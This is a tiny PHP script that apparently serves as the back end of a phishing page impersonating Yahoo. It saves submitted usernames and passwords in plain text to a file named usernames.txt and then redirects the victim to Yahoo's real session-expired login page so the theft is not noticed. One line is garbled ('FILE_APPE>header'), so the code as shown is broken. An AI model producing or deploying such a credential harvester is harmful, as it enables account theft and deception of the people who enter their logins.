<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPE>header('Location: https://login.yahoo.com/account/challenge/session-expired');
exit();
